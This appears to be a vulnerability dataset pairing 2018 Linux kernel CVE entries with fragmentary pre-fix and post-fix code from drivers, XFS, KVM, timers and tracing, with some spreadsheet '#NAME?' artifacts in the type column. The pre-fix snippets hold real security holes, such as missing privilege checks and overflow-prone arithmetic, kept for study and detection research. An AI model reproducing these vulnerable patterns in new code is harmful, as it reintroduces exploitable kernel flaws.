 pr_emerg(""mm %px mmap %px seqnum %d task_size %lu\n""
#ifdef CONFIG_MMU
 ""get_unmapped_area %px\n""
#endif
 ""tlb_flush_pending %d\n""
 ""def_flags: %#lx(%pGv)\n"",

		mm, mm->mmap, mm->vmacache_seqnum, mm->task_size,
#ifdef CONFIG_MMU
		mm->get_unmapped_area,
#endif
#endif
#define VMACACHE_HASH(addr) ((addr >> VMACACHE_SHIFT) & VMACACHE_MASK)

/*
 * Flush vma caches for threads that share a given mm.
 *
 * The operation is safe because the caller holds the mmap_sem
 * exclusively and other threads accessing the vma cache will
 * have mmap_sem held at least for read, so no extra locking
 * is required to maintain the vma cache.
 */
void vmacache_flush_all(struct mm_struct *mm)
{
 struct task_struct *g, *p;

 count_vm_vmacache_event(VMACACHE_FULL_FLUSHES);

 /*
	 * Single threaded tasks need not iterate the entire
	 * list of process. We can avoid the flushing as well
	 * since the mm's seqnum was increased and don't have
	 * to worry about other threads' seqnum. Current's
	 * flush will occur upon the next lookup.
 */
 if (atomic_read(&mm->mm_users) == 1)
 return;

 rcu_read_lock();
 for_each_process_thread(g, p) {
 /*
		 * Only flush the vmacache pointers as the
		 * mm seqnum is already set and curr's will
		 * be set upon invalidation when the next
		 * lookup is done.
 */
 if (mm == p->mm)
 vmacache_flush(p);
	}
 rcu_read_unlock();
}

/*
 * This task may be accessing a foreign mm via (for example)
 * get_user_pages()->find_vma().  The vmacache is task-local and this
"," struct {
 struct vm_area_struct *mmap;		/* list of VMAs */
 struct rb_root mm_rb;
 u64 vmacache_seqnum;                   /* per-thread vmacache */
#ifdef CONFIG_MMU
 unsigned long (*get_unmapped_area) (struct file *filp,
 unsigned long addr, unsigned long len,
#define VMACACHE_MASK (VMACACHE_SIZE - 1)

struct vmacache {
 u64 seqnum;
 struct vm_area_struct *vmas[VMACACHE_SIZE];
};

#ifdef CONFIG_DEBUG_VM_VMACACHE
		VMACACHE_FIND_CALLS,
		VMACACHE_FIND_HITS,

#endif
#ifdef CONFIG_SWAP
		SWAP_RA,
 memset(tsk->vmacache.vmas, 0, sizeof(tsk->vmacache.vmas));
}


extern void vmacache_update(unsigned long addr, struct vm_area_struct *newvma);
extern struct vm_area_struct *vmacache_find(struct mm_struct *mm,
 unsigned long addr);
static inline void vmacache_invalidate(struct mm_struct *mm)
{
	mm->vmacache_seqnum++;




}

#endif /* __LINUX_VMACACHE_H */

void dump_mm(const struct mm_struct *mm)
{
 pr_emerg(""mm %px mmap %px seqnum %llu task_size %lu\n""
#ifdef CONFIG_MMU
 ""get_unmapped_area %px\n""
#endif
 ""tlb_flush_pending %d\n""
 ""def_flags: %#lx(%pGv)\n"",

		mm, mm->mmap, (long long) mm->vmacache_seqnum, mm->task_size,
#ifdef CONFIG_MMU
		mm->get_unmapped_area,
#endif
#endif
#define VMACACHE_HASH(addr) ((addr >> VMACACHE_SHIFT) & VMACACHE_MASK)







































/*
 * This task may be accessing a foreign mm via (for example)
 * get_user_pages()->find_vma().  The vmacache is task-local and this
"
2019,,CVE-2018-16885,,
2018,Mem. Corr. ,CVE-2018-16884,,
2019,#NAME?,CVE-2018-16882,,
2019,Mem. Corr. ,CVE-2018-16880,,
2019,,CVE-2018-16871,,
2018,#NAME?,CVE-2018-16862,,
2018,#NAME?,CVE-2018-16658," if (!CDROM_CAN(CDC_SELECT_DISC) ||
	    (arg == CDSL_CURRENT || arg == CDSL_NONE))
 return cdi->ops->drive_status(cdi, CDSL_CURRENT);
 if (((int)arg >= cdi->capacity))
 return -EINVAL;
 return cdrom_slot_status(cdi, arg);
}
"," if (!CDROM_CAN(CDC_SELECT_DISC) ||
	    (arg == CDSL_CURRENT || arg == CDSL_NONE))
 return cdi->ops->drive_status(cdi, CDSL_CURRENT);
 if (arg >= cdi->capacity)
 return -EINVAL;
 return cdrom_slot_status(cdi, arg);
}
"
2018,,CVE-2018-16597,,
2018,,CVE-2018-16276," loff_t *ppos)
{
 struct usb_yurex *dev;
 int retval = 0;
 int bytes_read = 0;
 char in_buffer[20];
 unsigned long flags;

	dev = file->private_data;

 mutex_lock(&dev->io_mutex);
 if (!dev->interface) {		/* already disconnected */
 retval = -ENODEV;
 goto exit;
	}

 spin_lock_irqsave(&dev->lock, flags);
 bytes_read = snprintf(in_buffer, 20, ""%lld\n"", dev->bbu);
 spin_unlock_irqrestore(&dev->lock, flags);

 if (*ppos < bytes_read) {
 if (copy_to_user(buffer, in_buffer + *ppos, bytes_read - *ppos))
			retval = -EFAULT;
 else {
			retval = bytes_read - *ppos;
			*ppos += bytes_read;
		}
	}

exit:
 mutex_unlock(&dev->io_mutex);
 return retval;

}

static ssize_t yurex_write(struct file *file, const char __user *user_buffer,
"," loff_t *ppos)
{
 struct usb_yurex *dev;
 int len = 0;

 char in_buffer[20];
 unsigned long flags;

	dev = file->private_data;

 mutex_lock(&dev->io_mutex);
 if (!dev->interface) {		/* already disconnected */
 mutex_unlock(&dev->io_mutex);
 return -ENODEV;
	}

 spin_lock_irqsave(&dev->lock, flags);
 len = snprintf(in_buffer, 20, ""%lld\n"", dev->bbu);
 spin_unlock_irqrestore(&dev->lock, flags);











 mutex_unlock(&dev->io_mutex);

 return simple_read_from_buffer(buffer, count, ppos, in_buffer, len);
}

static ssize_t yurex_write(struct file *file, const char __user *user_buffer,
"
2018,#NAME?,CVE-2018-15594," struct branch *b = insnbuf;
 unsigned long delta = (unsigned long)target - (addr+5);

 if (tgt_clobbers & ~site_clobbers)
 return len;	/* target would clobber too much for this site */
 if (len < 5)

 return len;	/* call too long for patch site */


	b->opcode = 0xe8; /* call */
	b->delta = delta;
 struct branch *b = insnbuf;
 unsigned long delta = (unsigned long)target - (addr+5);

 if (len < 5)



 return len;	/* call too long for patch site */


	b->opcode = 0xe9;	/* jmp */
	b->delta = delta;
"," struct branch *b = insnbuf;
 unsigned long delta = (unsigned long)target - (addr+5);

 if (len < 5) {
#ifdef CONFIG_RETPOLINE
 WARN_ONCE(""Failing to patch indirect CALL in %ps\n"", (void *)addr);
#endif
 return len;	/* call too long for patch site */
	}

	b->opcode = 0xe8; /* call */
	b->delta = delta;
 struct branch *b = insnbuf;
 unsigned long delta = (unsigned long)target - (addr+5);

 if (len < 5) {
#ifdef CONFIG_RETPOLINE
 WARN_ONCE(""Failing to patch indirect JMP in %ps\n"", (void *)addr);
#endif
 return len;	/* call too long for patch site */
	}

	b->opcode = 0xe9;	/* jmp */
	b->delta = delta;
"
2018,,CVE-2018-15572," return cmd;
}

/* Check for Skylake-like CPUs (for RSB handling) */
static bool __init is_skylake_era(void)
{
 if (boot_cpu_data.x86_vendor == X86_VENDOR_INTEL &&
	    boot_cpu_data.x86 == 6) {
 switch (boot_cpu_data.x86_model) {
 case INTEL_FAM6_SKYLAKE_MOBILE:
 case INTEL_FAM6_SKYLAKE_DESKTOP:
 case INTEL_FAM6_SKYLAKE_X:
 case INTEL_FAM6_KABYLAKE_MOBILE:
 case INTEL_FAM6_KABYLAKE_DESKTOP:
 return true;
		}
	}
 return false;
}

static void __init spectre_v2_select_mitigation(void)
{
 enum spectre_v2_mitigation_cmd cmd = spectre_v2_parse_cmdline();
 pr_info(""%s\n"", spectre_v2_strings[mode]);

 /*
	 * If neither SMEP nor PTI are available, there is a risk of
	 * hitting userspace addresses in the RSB after a context switch
	 * from a shallow call stack to a deeper one. To prevent this fill
	 * the entire RSB, even when using IBRS.
	 *
	 * Skylake era CPUs have a separate issue with *underflow* of the
	 * RSB, when they will predict 'ret' targets from the generic BTB.
	 * The proper mitigation for this is IBRS. If IBRS is not supported
	 * or deactivated in favour of retpolines the RSB fill on context
	 * switch is required.
 */
 if ((!boot_cpu_has(X86_FEATURE_PTI) &&
	     !boot_cpu_has(X86_FEATURE_SMEP)) || is_skylake_era()) {
 setup_force_cpu_cap(X86_FEATURE_RSB_CTXSW);
 pr_info(""Spectre v2 mitigation: Filling RSB on context switch\n"");
	}

 /* Initialize Indirect Branch Prediction Barrier if supported */
 if (boot_cpu_has(X86_FEATURE_IBPB)) {
"," return cmd;
}


















static void __init spectre_v2_select_mitigation(void)
{
 enum spectre_v2_mitigation_cmd cmd = spectre_v2_parse_cmdline();
 pr_info(""%s\n"", spectre_v2_strings[mode]);

 /*
	 * If spectre v2 protection has been enabled, unconditionally fill
	 * RSB during a context switch; this protects against two independent
	 * issues:

	 *
	 *	- RSB underflow (and switch to BTB) on Skylake+
	 *	- SpectreRSB variant of spectre v2 on X86_BUG_SPECTRE_V2 CPUs



 */
 setup_force_cpu_cap(X86_FEATURE_RSB_CTXSW);
 pr_info(""Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch\n"");




 /* Initialize Indirect Branch Prediction Barrier if supported */
 if (boot_cpu_has(X86_FEATURE_IBPB)) {
"
2018,DoS Overflow +Info ,CVE-2018-15471,,
2018,DoS ,CVE-2018-14734," return NULL;

 mutex_lock(&mut);
	mc->id = idr_alloc(&multicast_idr, mc, 0, 0, GFP_KERNEL);
 mutex_unlock(&mut);
 if (mc->id < 0)
 goto error;
 goto err3;
	}





 mutex_unlock(&file->mut);
 ucma_put_ctx(ctx);
 return 0;
"," return NULL;

 mutex_lock(&mut);
	mc->id = idr_alloc(&multicast_idr, NULL, 0, 0, GFP_KERNEL);
 mutex_unlock(&mut);
 if (mc->id < 0)
 goto error;
 goto err3;
	}

 mutex_lock(&mut);
 idr_replace(&multicast_idr, mc, mc->id);
 mutex_unlock(&mut);

 mutex_unlock(&file->mut);
 ucma_put_ctx(ctx);
 return 0;
"
2018,DoS +Priv ,CVE-2018-14678,,
2018,,CVE-2018-14656,,
2018,DoS ,CVE-2018-14646,,
2018,,CVE-2018-14641,,
2018,Overflow ,CVE-2018-14634,,
2018,Overflow ,CVE-2018-14633,,
2018,#NAME?,CVE-2018-14625,,
2018,,CVE-2018-14619,,
2018,,CVE-2018-14617,,
2018,,CVE-2018-14616,,
2018,Overflow ,CVE-2018-14615,,
2018,,CVE-2018-14614,,
2018,,CVE-2018-14613,,
2018,,CVE-2018-14612,,
2018,,CVE-2018-14611,,
2018,,CVE-2018-14610,,
2018,,CVE-2018-14609,,
2018,Overflow ,CVE-2018-13406,"		    info->cmap.len || cmap->start < info->cmap.start)
 return -EINVAL;

		entries = kmalloc(sizeof(*entries) * cmap->len, GFP_KERNEL);

 if (!entries)
 return -ENOMEM;

","		    info->cmap.len || cmap->start < info->cmap.start)
 return -EINVAL;

		entries = kmalloc_array(cmap->len, sizeof(*entries),
					GFP_KERNEL);
 if (!entries)
 return -ENOMEM;

"
2018,,CVE-2018-13405,"	inode->i_uid = current_fsuid();
 if (dir && dir->i_mode & S_ISGID) {
		inode->i_gid = dir->i_gid;


 if (S_ISDIR(mode))
			mode |= S_ISGID;




	} else
		inode->i_gid = current_fsgid();
	inode->i_mode = mode;
","	inode->i_uid = current_fsuid();
 if (dir && dir->i_mode & S_ISGID) {
		inode->i_gid = dir->i_gid;

 /* Directories are special, and always inherit S_ISGID */
 if (S_ISDIR(mode))
			mode |= S_ISGID;
 else if ((mode & (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP) &&
			 !in_group_p(inode->i_gid) &&
			 !capable_wrt_inode_uidgid(dir, CAP_FSETID))
			mode &= ~S_ISGID;
	} else
		inode->i_gid = current_fsgid();
	inode->i_mode = mode;
"
2018,,CVE-2018-13100,,
2018,DoS ,CVE-2018-13099,,
2018,DoS ,CVE-2018-13098,,
2018,DoS ,CVE-2018-13097,,
2018,DoS ,CVE-2018-13096,,
2018,DoS Mem. Corr. ,CVE-2018-13095," XFS_DFORK_DSIZE(dip, mp) : \
		XFS_DFORK_ASIZE(dip, mp))




/*
 * Return pointers to the data or attribute forks.
 */
	}
}










































xfs_failaddr_t
xfs_dinode_verify(
 struct xfs_mount	*mp,
 case S_IFREG:
 case S_IFLNK:
 case S_IFDIR:
 switch (dip->di_format) {
 case XFS_DINODE_FMT_LOCAL:
 /*
			 * no local regular files yet
 */
 if (S_ISREG(mode))
 return __this_address;
 if (di_size > XFS_DFORK_DSIZE(dip, mp))
 return __this_address;
 if (dip->di_nextents)
 return __this_address;
 /* fall through */
 case XFS_DINODE_FMT_EXTENTS:
 case XFS_DINODE_FMT_BTREE:
 break;
 default:
 return __this_address;
		}
 break;
 case 0:
 /* Uninitialized inode ok. */
	}

 if (XFS_DFORK_Q(dip)) {
 switch (dip->di_aformat) {
 case XFS_DINODE_FMT_LOCAL:
 if (dip->di_anextents)
 return __this_address;
 /* fall through */
 case XFS_DINODE_FMT_EXTENTS:
 case XFS_DINODE_FMT_BTREE:
 break;
 default:
 return __this_address;
		}
	} else {
 /*
		 * If there is no fork offset, this may be a freshly-made inode
"," XFS_DFORK_DSIZE(dip, mp) : \
		XFS_DFORK_ASIZE(dip, mp))

#define XFS_DFORK_MAXEXT(dip, mp, w) \
	(XFS_DFORK_SIZE(dip, mp, w) / sizeof(struct xfs_bmbt_rec))

/*
 * Return pointers to the data or attribute forks.
 */
	}
}

static xfs_failaddr_t
xfs_dinode_verify_fork(
 struct xfs_dinode	*dip,
 struct xfs_mount	*mp,
 int			whichfork)
{
 uint32_t		di_nextents = XFS_DFORK_NEXTENTS(dip, whichfork);

 switch (XFS_DFORK_FORMAT(dip, whichfork)) {
 case XFS_DINODE_FMT_LOCAL:
 /*
		 * no local regular files yet
 */
 if (whichfork == XFS_DATA_FORK) {
 if (S_ISREG(be16_to_cpu(dip->di_mode)))
 return __this_address;
 if (be64_to_cpu(dip->di_size) >
 XFS_DFORK_SIZE(dip, mp, whichfork))
 return __this_address;
		}
 if (di_nextents)
 return __this_address;
 break;
 case XFS_DINODE_FMT_EXTENTS:
 if (di_nextents > XFS_DFORK_MAXEXT(dip, mp, whichfork))
 return __this_address;
 break;
 case XFS_DINODE_FMT_BTREE:
 if (whichfork == XFS_ATTR_FORK) {
 if (di_nextents > MAXAEXTNUM)
 return __this_address;
		} else if (di_nextents > MAXEXTNUM) {
 return __this_address;
		}
 break;
 default:
 return __this_address;
	}
 return NULL;
}

xfs_failaddr_t
xfs_dinode_verify(
 struct xfs_mount	*mp,
 case S_IFREG:
 case S_IFLNK:
 case S_IFDIR:
		fa = xfs_dinode_verify_fork(dip, mp, XFS_DATA_FORK);
 if (fa)
 return fa;















 break;
 case 0:
 /* Uninitialized inode ok. */
	}

 if (XFS_DFORK_Q(dip)) {
		fa = xfs_dinode_verify_fork(dip, mp, XFS_ATTR_FORK);
 if (fa)
 return fa;








	} else {
 /*
		 * If there is no fork offset, this may be a freshly-made inode
"
2018,,CVE-2018-13094," ASSERT(blkno == 0);
	error = xfs_attr3_leaf_create(args, blkno, &bp);
 if (error) {
		error = xfs_da_shrink_inode(args, 0, bp);
		bp = NULL;
 if (error)
 goto out;
 xfs_idata_realloc(dp, size, XFS_ATTR_FORK);	/* try to put */
 memcpy(ifp->if_u1.if_data, tmpbuffer, size);	/* it back */
"," ASSERT(blkno == 0);
	error = xfs_attr3_leaf_create(args, blkno, &bp);
 if (error) {
 /* xfs_attr3_leaf_create may not have instantiated a block */
 if (bp && (xfs_da_shrink_inode(args, 0, bp) != 0))

 goto out;
 xfs_idata_realloc(dp, size, XFS_ATTR_FORK);	/* try to put */
 memcpy(ifp->if_u1.if_data, tmpbuffer, size);	/* it back */
"
2018,,CVE-2018-13093," return error;
}









































/*
 * Check the validity of the inode we just found it the cache
 */
	}

 /*
	 * If lookup is racing with unlink return an error immediately.

 */
 if (VFS_I(ip)->i_mode == 0 && !(flags & XFS_IGET_CREATE)) {
 	error = -ENOENT;
 goto out_error;
	}

 /*
	 * If IRECLAIMABLE is set, we've torn down the VFS inode already.


 /*
	 * If we are allocating a new inode, then check what was returned is
	 * actually a free, empty inode. If we are not allocating an inode,
	 * the check we didn't find a free inode.
 */
 if (flags & XFS_IGET_CREATE) {
 if (VFS_I(ip)->i_mode != 0) {
 xfs_warn(mp,
""Corruption detected! Free inode 0x%llx not marked free on disk"",
				ino);
			error = -EFSCORRUPTED;
 goto out_destroy;
		}
 if (ip->i_d.di_nblocks != 0) {
 xfs_warn(mp,
""Corruption detected! Free inode 0x%llx has blocks allocated!"",
				ino);
			error = -EFSCORRUPTED;
 goto out_destroy;
		}
	} else if (VFS_I(ip)->i_mode == 0) {
		error = -ENOENT;
 goto out_destroy;
	}

 /*
	 * Preload the radix tree so we can insert safely under the
"," return error;
}

/*
 * If we are allocating a new inode, then check what was returned is
 * actually a free, empty inode. If we are not allocating an inode,
 * then check we didn't find a free inode.
 *
 * Returns:
 *	0		if the inode free state matches the lookup context
 *	-ENOENT		if the inode is free and we are not allocating
 *	-EFSCORRUPTED	if there is any state mismatch at all
 */
static int
xfs_iget_check_free_state(
 struct xfs_inode	*ip,
 int			flags)
{
 if (flags & XFS_IGET_CREATE) {
 /* should be a free inode */
 if (VFS_I(ip)->i_mode != 0) {
 xfs_warn(ip->i_mount,
""Corruption detected! Free inode 0x%llx not marked free! (mode 0x%x)"",
				ip->i_ino, VFS_I(ip)->i_mode);
 return -EFSCORRUPTED;
		}

 if (ip->i_d.di_nblocks != 0) {
 xfs_warn(ip->i_mount,
""Corruption detected! Free inode 0x%llx has blocks allocated!"",
				ip->i_ino);
 return -EFSCORRUPTED;
		}
 return 0;
	}

 /* should be an allocated inode */
 if (VFS_I(ip)->i_mode == 0)
 return -ENOENT;

 return 0;
}

/*
 * Check the validity of the inode we just found it the cache
 */
	}

 /*
	 * Check the inode free state is valid. This also detects lookup
	 * racing with unlinks.
 */
 error = xfs_iget_check_free_state(ip, flags);
 if (error)
 goto out_error;


 /*
	 * If IRECLAIMABLE is set, we've torn down the VFS inode already.


 /*
	 * Check the inode free state is valid. This also detects lookup
	 * racing with unlinks.

 */
	error = xfs_iget_check_free_state(ip, flags);
 if (error)















 goto out_destroy;


 /*
	 * Preload the radix tree so we can insert safely under the
"
2018,Overflow ,CVE-2018-13053,,
2018,DoS ,CVE-2018-12931,,
2018,DoS ,CVE-2018-12930,,
2018,DoS ,CVE-2018-12929,,
2018,,CVE-2018-12928,,
2018,DoS ,CVE-2018-12904," return 1;
	}







 if (vmx->nested.vmxon) {
 nested_vmx_failValid(vcpu, VMXERR_VMXON_IN_VMX_ROOT_OPERATION);
 return kvm_skip_emulated_instruction(vcpu);
 */
static int nested_vmx_check_permission(struct kvm_vcpu *vcpu)
{





 if (!to_vmx(vcpu)->nested.vmxon) {
 kvm_queue_exception(vcpu, UD_VECTOR);
 return 0;
 if (get_vmx_mem_address(vcpu, exit_qualification,
				vmx_instruction_info, true, &gva))
 return 1;
 /* _system ok, as hardware has verified cpl=0 */
 kvm_write_guest_virt_system(&vcpu->arch.emulate_ctxt, gva,
			     &field_value, (is_long_mode(vcpu) ? 8 : 4), NULL);
	}
 if (get_vmx_mem_address(vcpu, exit_qualification,
			vmx_instruction_info, true, &vmcs_gva))
 return 1;
 /* ok to use *_system, as hardware has verified cpl=0 */
 if (kvm_write_guest_virt_system(&vcpu->arch.emulate_ctxt, vmcs_gva,
				 (void *)&to_vmx(vcpu)->nested.current_vmptr,
 sizeof(u64), &e)) {
"," return 1;
	}

 /* CPL=0 must be checked manually. */
 if (vmx_get_cpl(vcpu)) {
 kvm_queue_exception(vcpu, UD_VECTOR);
 return 1;
	}

 if (vmx->nested.vmxon) {
 nested_vmx_failValid(vcpu, VMXERR_VMXON_IN_VMX_ROOT_OPERATION);
 return kvm_skip_emulated_instruction(vcpu);
 */
static int nested_vmx_check_permission(struct kvm_vcpu *vcpu)
{
 if (vmx_get_cpl(vcpu)) {
 kvm_queue_exception(vcpu, UD_VECTOR);
 return 0;
	}

 if (!to_vmx(vcpu)->nested.vmxon) {
 kvm_queue_exception(vcpu, UD_VECTOR);
 return 0;
 if (get_vmx_mem_address(vcpu, exit_qualification,
				vmx_instruction_info, true, &gva))
 return 1;
 /* _system ok, nested_vmx_check_permission has verified cpl=0 */
 kvm_write_guest_virt_system(&vcpu->arch.emulate_ctxt, gva,
			     &field_value, (is_long_mode(vcpu) ? 8 : 4), NULL);
	}
 if (get_vmx_mem_address(vcpu, exit_qualification,
			vmx_instruction_info, true, &vmcs_gva))
 return 1;
 /* *_system ok, nested_vmx_check_permission has verified cpl=0 */
 if (kvm_write_guest_virt_system(&vcpu->arch.emulate_ctxt, vmcs_gva,
				 (void *)&to_vmx(vcpu)->nested.current_vmptr,
 sizeof(u64), &e)) {
"
2018,DoS Overflow ,CVE-2018-12896," clockid_t		it_clock;
 timer_t			it_id;
 int			it_active;
 int			it_overrun;
 int			it_overrun_last;
 int			it_requeue_pending;
 int			it_sigev_notify;
 ktime_t			it_interval;
 continue;

		timer->it.cpu.expires += incr;
		timer->it_overrun += 1 << i;
		delta -= incr;
	}
}
}
__initcall(init_posix_timers);












static void common_hrtimer_rearm(struct k_itimer *timr)
{
 struct hrtimer *timer = &timr->it.real.timer;

 if (!timr->it_interval)
 return;

	timr->it_overrun += (unsigned int) hrtimer_forward(timer,
						timer->base->get_time(),
						timr->it_interval);
 hrtimer_restart(timer);
}


		timr->it_active = 1;
		timr->it_overrun_last = timr->it_overrun;
		timr->it_overrun = -1;
		++timr->it_requeue_pending;

		info->si_overrun += timr->it_overrun_last;
	}

 unlock_timer(timr, flags);
					now = ktime_add(now, kj);
			}
#endif
			timr->it_overrun += (unsigned int)
 hrtimer_forward(timer, now,
						timr->it_interval);
			ret = HRTIMER_RESTART;
			++timr->it_requeue_pending;
			timr->it_active = 1;
	new_timer->it_id = (timer_t) new_timer_id;
	new_timer->it_clock = which_clock;
	new_timer->kclock = kc;
	new_timer->it_overrun = -1;

 if (event) {
 rcu_read_lock();
	 * expiry time forward by intervals, so expiry is > now.
 */
 if (iv && (timr->it_requeue_pending & REQUEUE_PENDING || sig_none))
		timr->it_overrun += (int)kc->timer_forward(timr, now);

	remaining = kc->timer_remaining(timr, now);
 /* Return 0 only, when the timer is expired and not pending */
 if (!timr)
 return -EINVAL;

	overrun = timr->it_overrun_last;
 unlock_timer(timr, flags);

 return overrun;
"," clockid_t		it_clock;
 timer_t			it_id;
 int			it_active;
 s64			it_overrun;
 s64			it_overrun_last;
 int			it_requeue_pending;
 int			it_sigev_notify;
 ktime_t			it_interval;
 continue;

		timer->it.cpu.expires += incr;
		timer->it_overrun += 1LL << i;
		delta -= incr;
	}
}
}
__initcall(init_posix_timers);

/*
 * The siginfo si_overrun field and the return value of timer_getoverrun(2)
 * are of type int. Clamp the overrun value to INT_MAX
 */
static inline int timer_overrun_to_int(struct k_itimer *timr, int baseval)
{
	s64 sum = timr->it_overrun_last + (s64)baseval;

 return sum > (s64)INT_MAX ? INT_MAX : (int)sum;
}

static void common_hrtimer_rearm(struct k_itimer *timr)
{
 struct hrtimer *timer = &timr->it.real.timer;

 if (!timr->it_interval)
 return;

	timr->it_overrun += hrtimer_forward(timer, timer->base->get_time(),
					    timr->it_interval);

 hrtimer_restart(timer);
}


		timr->it_active = 1;
		timr->it_overrun_last = timr->it_overrun;
		timr->it_overrun = -1LL;
		++timr->it_requeue_pending;

		info->si_overrun = timer_overrun_to_int(timr, info->si_overrun);
	}

 unlock_timer(timr, flags);
					now = ktime_add(now, kj);
			}
#endif
			timr->it_overrun += hrtimer_forward(timer, now,
							    timr->it_interval);

			ret = HRTIMER_RESTART;
			++timr->it_requeue_pending;
			timr->it_active = 1;
	new_timer->it_id = (timer_t) new_timer_id;
	new_timer->it_clock = which_clock;
	new_timer->kclock = kc;
	new_timer->it_overrun = -1LL;

 if (event) {
 rcu_read_lock();
	 * expiry time forward by intervals, so expiry is > now.
 */
 if (iv && (timr->it_requeue_pending & REQUEUE_PENDING || sig_none))
		timr->it_overrun += kc->timer_forward(timr, now);

	remaining = kc->timer_remaining(timr, now);
 /* Return 0 only, when the timer is expired and not pending */
 if (!timr)
 return -EINVAL;

	overrun = timer_overrun_to_int(timr, 0);
 unlock_timer(timr, flags);

 return overrun;
"
2018,DoS ,CVE-2018-12714,"associated event field will be saved in a variable but won't be summed
as a value:

  # echo 'hist:keys=next_pid:ts1=common_timestamp ... >> event/trigger

Multiple variables can be assigned at the same time.  The below would
result in both ts0 and b being created as variables, with both
common_timestamp and field1 additionally being summed as values:

  # echo 'hist:keys=pid:vals=$ts0,$b:ts0=common_timestamp,b=field1 ... >> \
	event/trigger

Note that variable assignments can appear either preceding or
following their use.  The command below behaves identically to the
command above:

  # echo 'hist:keys=pid:ts0=common_timestamp,b=field1:vals=$ts0,$b ... >> \
	event/trigger

Any number of variables not bound to a 'vals=' prefix can also be
assigned by simply separating them with colons.  Below is the same
thing but without the values being summed in the histogram:

  # echo 'hist:keys=pid:ts0=common_timestamp:b=field1 ... >> event/trigger

Variables set as above can be referenced and used in expressions on
another event.

For example, here's how a latency can be calculated:

  # echo 'hist:keys=pid,prio:ts0=common_timestamp ... >> event1/trigger
  # echo 'hist:keys=next_pid:wakeup_lat=common_timestamp-$ts0 ... >> event2/trigger

In the first line above, the event's timetamp is saved into the
variable ts0.  In the next line, ts0 is subtracted from the second
makes use of the wakeup_lat variable to compute a combined latency
using the same key and variable from yet another event:

  # echo 'hist:key=pid:wakeupswitch_lat=$wakeup_lat+$switchtime_lat ... >> event3/trigger

2.2.2 Synthetic Events
----------------------
At this point, there isn't yet an actual 'wakeup_latency' event
instantiated in the event subsytem - for this to happen, a 'hist
trigger action' needs to be instantiated and bound to actual fields
and variables defined on other events (see Section 6.3.3 below).



Once that is done, an event instance is created, and a histogram can
be defined using it:

  # echo 'hist:keys=pid,prio,lat.log2:sort=pid,lat' >> \
        /sys/kernel/debug/tracing/events/synthetic/wakeup_latency/trigger
    back to that pid, the timestamp difference is calculated.  If the
    resulting latency, stored in wakeup_lat, exceeds the current
    maximum latency, the values specified in the save() fields are
 recoreded:

    # echo 'hist:keys=pid:ts0=common_timestamp.usecs \
            if comm==""cyclictest""' >> \
{
 lockdep_assert_irqs_disabled();




 if (softirq_count() == (cnt & SOFTIRQ_MASK))
 trace_softirqs_on(_RET_IP_);
 preempt_count_sub(cnt);

}

/*
void
update_max_tr(struct trace_array *tr, struct task_struct *tsk, int cpu)
{
 struct ring_buffer *buf;

 if (tr->stop_count)
 return;


 arch_spin_lock(&tr->max_lock);

	buf = tr->trace_buffer.buffer;
	tr->trace_buffer.buffer = tr->max_buffer.buffer;
	tr->max_buffer.buffer = buf;

 __update_max_tr(tr, tsk, cpu);
 arch_spin_unlock(&tr->max_lock);
	C(TOO_MANY_PREDS,	""Too many terms in predicate expression""), \
	C(INVALID_FILTER,	""Meaningless filter expression""),	\
	C(IP_FIELD_ONLY,	""Only 'ip' field is supported for function trace""), \
	C(INVALID_VALUE,	""Invalid value (did you forget quotes)?""),


#undef C
#define C(a, b)		FILT_ERR_##a
 goto out_free;
	}








	prog[N].pred = NULL;					/* #13 */
	prog[N].target = 1;		/* TRUE */
	prog[N+1].pred = NULL;
	     ""$(CC_FLAGS_FTRACE)"" ]; then			\
		$(sub_cmd_record_mcount)			\
	fi;

endif # CONFIG_FTRACE_MCOUNT_RECORD

ifdef CONFIG_STACK_VALIDATION
  objtool_args += --retpoline
endif
endif
endif


ifdef CONFIG_MODVERSIONS
","associated event field will be saved in a variable but won't be summed
as a value:

  # echo 'hist:keys=next_pid:ts1=common_timestamp ...' >> event/trigger

Multiple variables can be assigned at the same time.  The below would
result in both ts0 and b being created as variables, with both
common_timestamp and field1 additionally being summed as values:

  # echo 'hist:keys=pid:vals=$ts0,$b:ts0=common_timestamp,b=field1 ...' >> \
	event/trigger

Note that variable assignments can appear either preceding or
following their use.  The command below behaves identically to the
command above:

  # echo 'hist:keys=pid:ts0=common_timestamp,b=field1:vals=$ts0,$b ...' >> \
	event/trigger

Any number of variables not bound to a 'vals=' prefix can also be
assigned by simply separating them with colons.  Below is the same
thing but without the values being summed in the histogram:

  # echo 'hist:keys=pid:ts0=common_timestamp:b=field1 ...' >> event/trigger

Variables set as above can be referenced and used in expressions on
another event.

For example, here's how a latency can be calculated:

  # echo 'hist:keys=pid,prio:ts0=common_timestamp ...' >> event1/trigger
  # echo 'hist:keys=next_pid:wakeup_lat=common_timestamp-$ts0 ...' >> event2/trigger

In the first line above, the event's timetamp is saved into the
variable ts0.  In the next line, ts0 is subtracted from the second
makes use of the wakeup_lat variable to compute a combined latency
using the same key and variable from yet another event:

  # echo 'hist:key=pid:wakeupswitch_lat=$wakeup_lat+$switchtime_lat ...' >> event3/trigger

2.2.2 Synthetic Events
----------------------
At this point, there isn't yet an actual 'wakeup_latency' event
instantiated in the event subsytem - for this to happen, a 'hist
trigger action' needs to be instantiated and bound to actual fields
and variables defined on other events (see Section 2.2.3 below on
how that is done using hist trigger 'onmatch' action). Once that is
done, the 'wakeup_latency' synthetic event instance is created.

A histogram can now be defined for the new synthetic event:


  # echo 'hist:keys=pid,prio,lat.log2:sort=pid,lat' >> \
        /sys/kernel/debug/tracing/events/synthetic/wakeup_latency/trigger
    back to that pid, the timestamp difference is calculated.  If the
    resulting latency, stored in wakeup_lat, exceeds the current
    maximum latency, the values specified in the save() fields are
 recorded:

    # echo 'hist:keys=pid:ts0=common_timestamp.usecs \
            if comm==""cyclictest""' >> \
{
 lockdep_assert_irqs_disabled();

 if (preempt_count() == cnt)
 trace_preempt_on(CALLER_ADDR0, get_lock_parent_ip());

 if (softirq_count() == (cnt & SOFTIRQ_MASK))
 trace_softirqs_on(_RET_IP_);

 __preempt_count_sub(cnt);
}

/*
void
update_max_tr(struct trace_array *tr, struct task_struct *tsk, int cpu)
{


 if (tr->stop_count)
 return;


 arch_spin_lock(&tr->max_lock);

 swap(tr->trace_buffer.buffer, tr->max_buffer.buffer);



 __update_max_tr(tr, tsk, cpu);
 arch_spin_unlock(&tr->max_lock);
	C(TOO_MANY_PREDS,	""Too many terms in predicate expression""), \
